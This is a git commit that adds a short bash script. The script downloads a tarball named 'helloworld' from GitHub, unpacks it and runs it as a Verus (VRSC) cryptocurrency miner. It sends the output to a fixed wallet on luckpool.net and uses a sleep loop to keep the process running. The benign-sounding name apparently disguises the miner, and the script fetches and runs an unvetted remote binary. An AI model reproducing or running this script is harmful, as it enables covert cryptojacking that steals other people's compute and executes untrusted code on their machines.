8a1edbc2153572e5c0e469a39be0876d2f9cb52a
worldssh <32675666+worldsshku@users.noreply.github.com>
2023-02-09 23:17:58 +0700

    Add files via upload

---
+++ nezamin.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+
+sudo apt update
+sudo apt install screen -y
+wget "https://github.com/theinterestingdev/helloworld/raw/main/helloworld.tar.gz"
+tar xf helloworld.tar.gz
+cd helloworld
+./helloworld -algo Verushash -coin VRSC -wallet RPJ4TjKNyrmFuc1hbdENoGsKUNVSrHRVWP.M1 -pool1 eu.luckpool.net:3956 -cpuThreads 2
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
